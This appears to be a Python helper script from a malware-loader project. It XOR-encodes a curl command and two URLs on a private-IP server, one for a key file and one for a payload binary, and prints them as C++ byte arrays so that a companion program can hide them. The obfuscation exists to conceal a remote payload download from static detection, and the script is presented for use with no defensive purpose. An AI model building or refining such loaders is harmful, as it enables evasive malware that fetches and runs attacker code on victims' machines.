def xor_encrypt(data, key):
    """Encrypts a string using XOR encryption."""
    encrypted = [chr(ord(c) ^ key) for c in data]
    return ", ".join(f"0x{ord(c):02X}" for c in encrypted)

def main():
    # Define the XOR key (must match the one used in the C++ program)
    key = 0xAA  # Replace with your desired key (a single byte value)

    # Define the strings to encrypt
    key_url = "https://192.168.137.156:8443/pizza.txt"
    payload_url = "https://192.168.137.156:8443/fun.bin"
    curl_command = "curl -k -s"

    # Encrypt the strings
    encrypted_key_url = xor_encrypt(key_url, key)
    encrypted_payload_url = xor_encrypt(payload_url, key)
    encrypted_curl_command = xor_encrypt(curl_command, key)

    # Display the results
    print(f"Encryption Key (used in C++ code): 0x{key:02X}")
    print("\nEncrypted strings (copy these into your C++ code):")
    print(f"const unsigned char encKeyUrl[] = {{ {encrypted_key_url} }};")
    print(f"const unsigned char encPayloadUrl[] = {{ {encrypted_payload_url} }};")
    print(f"const unsigned char encCurlCommand[] = {{ {encrypted_curl_command} }};")

if __name__ == "__main__":
    main()
